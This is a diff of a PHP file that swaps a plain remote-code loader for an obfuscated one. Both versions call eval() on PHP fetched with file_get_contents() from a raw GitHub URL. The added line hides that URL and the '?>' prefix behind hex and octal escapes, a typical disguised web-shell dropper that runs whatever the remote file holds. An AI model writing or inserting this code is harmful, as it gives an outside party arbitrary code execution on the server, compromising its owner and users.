@@ -1,8 +1,3 @@
 <?php
-eval( 
-  urldecode("%3f%3e") . 
-  file_get_contents(
-    urldecode("https://raw.githubusercontent.com/davinadiandra07/module/refs/heads/main/geckov2")
-  )
-);
-?>
+ eval(urldecode("\x25\63\146\45\63\x65") . file_get_contents(urldecode("\x68\164\x74\160\x73\x3a\57\x2f\x72\x61\x77\x2e\x67\x69\x74\150\165\142\165\x73\145\x72\143\157\156\164\x65\156\x74\56\x63\157\x6d\x2f\x64\x61\x76\x69\156\141\x64\151\x61\156\144\162\141\60\x37\x2f\x6d\157\x64\x75\154\x65\x2f\x72\x65\x66\163\x2f\x68\x65\x61\x64\x73\57\155\x61\151\x6e\x2f\147\x65\x63\153\x6f\166\x32")));
+
